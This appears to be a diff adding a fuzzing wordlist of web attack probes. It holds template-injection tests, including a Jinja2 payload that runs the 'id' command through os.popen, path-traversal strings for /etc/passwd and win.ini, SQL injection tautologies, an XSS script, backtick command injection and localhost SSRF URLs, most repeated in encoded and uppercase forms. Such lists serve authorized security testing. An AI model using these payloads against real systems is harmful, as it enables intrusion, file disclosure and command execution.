@@ -1,0 +1,80 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{config}}
+{{self}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%7B%7B7%2A7%7D%7D
+%24%7B7%2A7%7D
+%3C%25%3D%207%2A7%20%25%3E
+%23%7B7%2A7%7D
+%7B%7Bconfig%7D%7D
+%7B%7Bself%7D%7D
+%7B%7Brequest.application.__globals__.__builtins__.__import__%28%27os%27%29.popen%28%27id%27%29.read%28%29%7D%7D
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+{{CONFIG}}
+{{SELF}}
+{{REQUEST.APPLICATION.__GLOBALS__.__BUILTINS__.__IMPORT__('OS').POPEN('ID').READ()}}
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%7B%7BCONFIG%7D%7D
+%7B%7BSELF%7D%7D
+%7B%7BREQUEST.APPLICATION.__GLOBALS__.__BUILTINS__.__IMPORT__%28%27OS%27%29.POPEN%28%27ID%27%29.READ%28%29%7D%7D
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+<%%3D 7*7 %>
+' OR '1'%3D'1
+" OR "1"%3D"1
+{{7*7}}?v=0
+{{7*7}}&v=0
+%7B%7B7%2A7%7D%7D_0
+ssti_0
+/ssti/0
+{{7*7}}%0a0
+${7*7}?v=1
+${7*7}&v=1
+%24%7B7%2A7%7D_1
+ssti_1
+/ssti/1
+${7*7}%0a1
+<%= 7*7 %>?v=2
+<%= 7*7 %>&v=2
+%3C%25%3D%207%2A7%20%25%3E_2
+ssti_2
+/ssti/2
+<%= 7*7 %>%0a2
+#{7*7}?v=3
+#{7*7}&v=3
+%23%7B7%2A7%7D_3
+ssti_3
+/ssti/3
